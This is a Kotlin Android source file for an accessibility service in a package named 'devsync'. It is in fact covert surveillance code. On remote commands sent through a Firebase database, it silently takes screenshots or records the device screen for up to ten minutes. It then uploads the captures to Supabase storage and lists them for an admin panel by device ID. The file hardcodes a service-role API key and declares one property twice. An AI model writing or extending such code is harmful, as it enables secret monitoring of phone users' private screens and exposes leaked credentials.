package com.example.devsync

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.graphics.Bitmap
import android.os.Build
import android.provider.Settings
import android.view.accessibility.AccessibilityEvent
import com.google.firebase.database.*
import kotlinx.coroutines.*
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.ByteArrayOutputStream
import java.io.File
import java.io.FileOutputStream
import java.util.concurrent.Executor
import kotlin.coroutines.resume
import kotlin.coroutines.suspendCoroutine

class ScreenshotService : AccessibilityService() {

    companion object {
        const val DB_URL       = "https://mygptaap-default-rtdb.asia-southeast1.firebasedatabase.app"
        const val SUPABASE_URL = "https://xzslribjzliewpyattcl.supabase.co"
        const val SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inh6c2xyaWJqemxpZXdweWF0dGNsIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc3ODc4OTY1NywiZXhwIjoyMDk0MzY1NjU3fQ.bZ2kCJesIeeTbZ5L1GrNzYAaDK5v3Ba8-R-SGWIU-A8"
        const val BUCKET_SS  = "screenshots"
        const val BUCKET_VID = "videos"
        const val FPS        = 2          // 2 frames per second
        const val MAX_FRAMES = 1200       // 10 min safety cap
    }

    private val deviceId by lazy {
        Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
    }
    private val database by lazy {
        FirebaseDatabase.getInstance(DB_URL).getReference("devices/$deviceId")
    }
    private val regRef by lazy {
        FirebaseDatabase.getInstance(DB_URL).getReference("registered_devices/$deviceId")
    }
    private val http = OkHttpClient.Builder()
        .callTimeout(180, java.util.concurrent.TimeUnit.SECONDS)
        .build()

    private var liveCapJob: Job? = null
    private var isLiveEnabled   = false
    private val serviceScope    = CoroutineScope(Dispatchers.Main + SupervisorJob())

    // Frames stored as JPEG files on disk — no OOM even for long captures
    private val frameFiles = mutableListOf<File>()
    private val frameLock  = Any()

    private val deviceId by lazy {
        Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
    }
    private val accessibilityRef by lazy {
        FirebaseDatabase.getInstance("https://mygptaap-default-rtdb.asia-southeast1.firebasedatabase.app").getReference("registered_devices/$deviceId/accessibility_online")
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        try { accessibilityRef.setValue(true) } catch (_: Exception) {}
        serviceInfo = AccessibilityServiceInfo().apply {
            eventTypes   = AccessibilityEvent.TYPES_ALL_MASK
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            flags        = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS
        }
        regRef.child("accessibility_granted").setValue(true)
        listenForCommands()
    }

    private fun listenForCommands() {
        // ── Single screenshot ────────────────────────────────────────────────
        database.child("take_screenshot").addValueEventListener(object : ValueEventListener {
            override fun onDataChange(s: DataSnapshot) {
                if (s.exists() && s.getValue(Boolean::class.java) == true) {
                    database.child("take_screenshot").removeValue()
                    reportStatus("📸 Taking screenshot...")
                    captureOne { bmp -> uploadScreenshot(bmp) }
                }
            }
            override fun onCancelled(e: DatabaseError) {}
        })

        // ── Live capture toggle ───────────────────────────────────────────────
        database.child("live_capture_enabled").addValueEventListener(object : ValueEventListener {
            override fun onDataChange(s: DataSnapshot) {
                val enabled = s.getValue(Boolean::class.java) ?: false
                if (enabled && !isLiveEnabled) {
                    isLiveEnabled = true
                    synchronized(frameLock) { frameFiles.clear() }
                    startLiveCapture()
                } else if (!enabled && isLiveEnabled) {
                    isLiveEnabled = false
                    liveCapJob?.cancel()
                    // Compile all captured frames into one video
                    val files = synchronized(frameLock) { frameFiles.toList() }
                    if (files.size >= 2) {
                        reportStatus("🎬 Compiling ${files.size} frames into video...")
                        serviceScope.launch(Dispatchers.IO) { compileAndUpload(files) }
                    } else {
                        reportStatus("⏹ Live capture stopped (${files.size} frames — too few)")
                        files.forEach { it.delete() }
                        synchronized(frameLock) { frameFiles.clear() }
                    }
                }
            }
            override fun onCancelled(e: DatabaseError) {}
        })

        // ── Stop all ─────────────────────────────────────────────────────────
        database.child("stop_all").addValueEventListener(object : ValueEventListener {
            override fun onDataChange(s: DataSnapshot) {
                if (s.exists() && s.getValue(Boolean::class.java) == true && isLiveEnabled) {
                    isLiveEnabled = false
                    liveCapJob?.cancel()
                    val files = synchronized(frameLock) { frameFiles.toList() }
                    if (files.size >= 2)
                        serviceScope.launch(Dispatchers.IO) { compileAndUpload(files) }
                }
            }
            override fun onCancelled(e: DatabaseError) {}
        })
    }

    // ── Live capture loop ─────────────────────────────────────────────────────

    private fun startLiveCapture() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
            reportStatus("❌ Live capture requires Android 11+")
            isLiveEnabled = false; return
        }
        reportStatus("🔴 Live capture ON — collecting frames...")

        liveCapJob = serviceScope.launch {
            while (isActive && isLiveEnabled) {
                val bmp = withTimeoutOrNull(3_000L) { captureOneSuspend() }
                if (bmp != null) {
                    withContext(Dispatchers.IO) { saveFrameToDisk(bmp) }
                }

                val count = synchronized(frameLock) { frameFiles.size }
                if (count % 20 == 0 && count > 0)
                    reportStatus("🔴 Capturing... $count frames (${count / FPS}s)")

                // Safety cap — auto compile and continue
                if (count >= MAX_FRAMES) {
                    reportStatus("⚠️ Max frames reached — auto saving...")
                    isLiveEnabled = false
                    liveCapJob?.cancel()
                    val files = synchronized(frameLock) { frameFiles.toList() }
                    withContext(Dispatchers.IO) { compileAndUpload(files) }
                    return@launch
                }

                delay(1000L / FPS)
            }
        }
    }

    private fun saveFrameToDisk(bmp: Bitmap) {
        try {
            val file = File(cacheDir, "frame_${System.currentTimeMillis()}.jpg")
            FileOutputStream(file).use { out ->
                bmp.compress(Bitmap.CompressFormat.JPEG, 80, out)
            }
            bmp.recycle()
            synchronized(frameLock) { frameFiles.add(file) }
        } catch (_: Exception) {
            bmp.recycle()
        }
    }

    // ── Compile all frames → single video → upload ────────────────────────────

    private fun compileAndUpload(files: List<File>) {
        if (files.size < 2) {
            files.forEach { it.delete() }
            synchronized(frameLock) { frameFiles.clear() }
            reportStatus("⏹ Not enough frames")
            return
        }
        try {
            val outFile = File(cacheDir,
                "vid_${deviceId.takeLast(4)}_${System.currentTimeMillis()}.mp4")

            reportStatus("🎬 Encoding ${files.size} frames (${files.size / FPS}s)...")
            val ok = VideoEncoderHelper.encodeFromFiles(files, FPS, outFile)

            // Clean up frame files
            files.forEach { it.delete() }
            synchronized(frameLock) { frameFiles.clear() }

            if (ok && outFile.exists() && outFile.length() > 1024L) {
                reportStatus("📤 Uploading video (${outFile.length() / 1024}KB)...")
                uploadVideo(outFile)
            } else {
                outFile.delete()
                reportStatus("❌ Encoding failed or empty output")
            }
        } catch (e: Exception) {
            files.forEach { it.delete() }
            synchronized(frameLock) { frameFiles.clear() }
            reportStatus("❌ Compile error: ${e.message?.take(60)}")
        }
    }

    private fun uploadVideo(file: File) {
        try {
            val ts       = System.currentTimeMillis()
            val fileName = "vid_${deviceId.takeLast(6)}_$ts.mp4"
            val body     = file.readBytes().toRequestBody("video/mp4".toMediaType())
            val req = Request.Builder()
                .url("$SUPABASE_URL/storage/v1/object/$BUCKET_VID/$fileName")
                .header("Authorization", "Bearer $SUPABASE_KEY")
                .header("apikey", SUPABASE_KEY)
                .header("Content-Type", "video/mp4")
                .header("x-upsert", "true")
                .post(body).build()

            http.newCall(req).execute().use { resp ->
                if (resp.isSuccessful) {
                    val url = "$SUPABASE_URL/storage/v1/object/public/$BUCKET_VID/$fileName"
                    // Write to "recordings" node with type="video"
                    // → admin panel shows it alongside audio recordings
                    FirebaseDatabase.getInstance(DB_URL)
                        .getReference("recordings").push()
                        .setValue(mapOf(
                            "deviceId"  to deviceId,
                            "type"      to "video",
                            "url"       to url,
                            "timestamp" to ts,
                            "fileName"  to fileName
                        ))
                    reportStatus("✅ Video uploaded (${file.length() / 1024}KB)")
                } else {
                    reportStatus("❌ Video ${resp.code}: ${resp.body?.string()?.take(80)}")
                }
            }
            file.delete()
        } catch (e: Exception) {
            reportStatus("❌ Video upload: ${e.message?.take(60)}")
        }
    }

    // ── Single screenshot ─────────────────────────────────────────────────────

    private fun captureOne(onResult: (Bitmap) -> Unit) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
            reportStatus("❌ Requires Android 11+"); return
        }
        val executor = Executor { cmd -> cmd.run() }
        @Suppress("NewApi")
        takeScreenshot(android.view.Display.DEFAULT_DISPLAY, executor,
            object : TakeScreenshotCallback {
                override fun onSuccess(r: ScreenshotResult) {
                    val bmp = Bitmap.wrapHardwareBuffer(r.hardwareBuffer, r.colorSpace)
                        ?.copy(Bitmap.Config.ARGB_8888, false)
                    r.hardwareBuffer.close()
                    if (bmp != null) onResult(bmp) else reportStatus("❌ Bitmap null")
                }
                override fun onFailure(code: Int) { reportStatus("❌ Capture failed: $code") }
            })
    }

    @Suppress("NewApi")
    private suspend fun captureOneSuspend(): Bitmap? = suspendCoroutine { cont ->
        val executor = Executor { cmd -> cmd.run() }
        takeScreenshot(android.view.Display.DEFAULT_DISPLAY, executor,
            object : TakeScreenshotCallback {
                override fun onSuccess(r: ScreenshotResult) {
                    val bmp = Bitmap.wrapHardwareBuffer(r.hardwareBuffer, r.colorSpace)
                        ?.copy(Bitmap.Config.ARGB_8888, false)
                    r.hardwareBuffer.close()
                    cont.resume(bmp)
                }
                override fun onFailure(code: Int) { cont.resume(null) }
            })
    }

    // ── Screenshot upload ─────────────────────────────────────────────────────

    private fun uploadScreenshot(bitmap: Bitmap) {
        CoroutineScope(Dispatchers.IO).launch {
            try {
                val stream = ByteArrayOutputStream()
                bitmap.compress(Bitmap.CompressFormat.JPEG, 85, stream)
                val bytes    = stream.toByteArray()
                bitmap.recycle()
                val ts       = System.currentTimeMillis()
                val fileName = "${deviceId}_$ts.jpg"
                val req = Request.Builder()
                    .url("$SUPABASE_URL/storage/v1/object/$BUCKET_SS/$fileName")
                    .header("Authorization", "Bearer $SUPABASE_KEY")
                    .header("apikey", SUPABASE_KEY)
                    .header("Content-Type", "image/jpeg")
                    .header("x-upsert", "true")
                    .post(bytes.toRequestBody("image/jpeg".toMediaType())).build()
                http.newCall(req).execute().use { resp ->
                    if (resp.isSuccessful) {
                        val url = "$SUPABASE_URL/storage/v1/object/public/$BUCKET_SS/$fileName"
                        FirebaseDatabase.getInstance(DB_URL)
                            .getReference("screenshots").push()
                            .setValue(mapOf("deviceId" to deviceId, "url" to url, "timestamp" to ts))
                        reportStatus("📸 Screenshot uploaded ✅")
                    } else reportStatus("❌ SS ${resp.code}: ${resp.body?.string()?.take(80)}")
                }
            } catch (e: Exception) { reportStatus("❌ SS: ${e.message?.take(60)}") }
        }
    }

    private fun reportStatus(status: String) {
        regRef.child("lastStatus").setValue(status)
        regRef.child("lastStatusTime").setValue(ServerValue.TIMESTAMP)
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {}
    override fun onInterrupt() { try { accessibilityRef.setValue(false) } catch (_: Exception) {} }
    override fun onDestroy() {
        try { accessibilityRef.setValue(false) } catch (_: Exception) {}
        super.onDestroy()
        isLiveEnabled = false
        liveCapJob?.cancel()
        serviceScope.cancel()
        synchronized(frameLock) { frameFiles.forEach { it.delete() }; frameFiles.clear() }
        regRef.child("accessibility_granted").setValue(false)
    }
}
